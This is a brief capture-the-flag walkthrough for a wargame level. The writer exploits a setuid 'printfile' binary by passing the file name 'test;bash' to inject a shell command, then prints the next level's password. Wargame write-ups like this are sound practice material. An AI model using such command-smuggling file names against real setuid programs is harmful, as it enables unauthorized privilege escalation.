There's a file named printfile

```
file printfile
setuid ELF 32-bit LSB executable
```

```
./printfile /etc/passwd
```

```
ls -la
-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
```

It's setuid is leviathan3 but i can't read the password of the next level

```
ltrace ./printfile /etc/leviathan_pass/leviathan3
```

```
mktemp -d
cd /tmp/tmp.QNwyizPIf9
```

```
touch 'test;bash'
/home/leviathan2/printfile 'test;bash'
```

Ahdiemoo1j
